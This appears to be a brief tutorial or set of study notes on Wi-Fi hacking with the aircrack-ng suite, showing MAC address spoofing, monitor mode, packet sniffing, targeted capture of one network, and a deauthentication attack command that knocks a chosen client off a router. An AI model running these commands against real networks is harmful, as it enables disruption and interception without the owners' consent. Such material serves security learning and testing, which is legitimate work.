# Network Hacking

* To list all network interfaces available, we can use `ifconfig`. The MAC address can be viewed under _ether_ in _wlan0_.

* To change the MAC address:

```shell
ifconfig wlan0 down #disables wlan0

ifconfig wlan0 hw ether 00:11:22:33:44:55 #sets hardware address of wlan0

ifconfig wlan0 up #enables wlan0
```

* To list only wireless interfaces, we can use `iwconfig`.

* To change _wlan0_ to monitor mode:

```shell
ifconfig wlan0 down

airmon-ng check kill #optional; kills any process that disturb interface in monitor mode

iwconfig wlan0 mode monitor #changes wlan0 mode to monitor

ifconfig wlan0 up
```

---

* To sniff packets, we can use _airodump-ng_:

```shell
airodump-ng wlan0 #here, wlan0 must be in monitor mode in order to fetch details
```

* To sniff packets on particular wifi bands:

```shell
airodump-ng --band a wlan0 #captures all networks with 5 GHz band

airodump-ng --band abg wlan0 #captures 2.5 GHz and 5 GHz networks at the same time
```

* To do targeted packet sniffing:

```shell
airodump-ng --bssid 54:37:BB:B5:BB:09 --channel 4 --write testfile wlan0 #captures a particular network with given bssid and channel number, then it saves data to a file called testfile
#this will also show the devices connected to network
```

* To run a deauthentication attack, which can disconnect any client from any network:

```shell
aireplay-ng --deauth 100000000 -a 54:37:BB:B5:BB:09 -c 70:BB:E9:7B:AE:D2 wlan0
#here, aireplay-ng is the program name, followed by the deauth attack specifications including the MAC address of target router (-a) and MAC address of target client (-c)
```

---
